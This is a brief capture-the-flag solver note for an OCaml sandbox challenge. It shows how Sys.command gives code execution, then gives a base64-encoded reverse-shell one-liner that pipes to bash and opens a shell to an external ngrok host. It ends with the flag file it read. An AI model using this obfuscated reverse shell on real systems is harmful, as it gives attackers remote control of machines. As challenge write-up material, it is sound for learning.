## Solver
```
https://stackoverflow.com/questions/40271646/how-do-i-execute-a-command-using-a-local-program-in-ocaml

Use Sys.command "{command here}";;

Reverse Shell
Sys.command "echo 'c2ggLWkgPiYgL2Rldi90Y3AvMC50Y3AuYXAubmdyb2suaW8vMTA3MzkgMD4mMQo=' | base64 -d | bash";;

Flag Location
/secret/flag-1d573e0faa99.json

cat secret/*
{
    "message": "Flag is here. OCaml syntax is easy, right?",
    "flag": "cvctf{J41L3d_OOOO-C4mL@@}"
}
```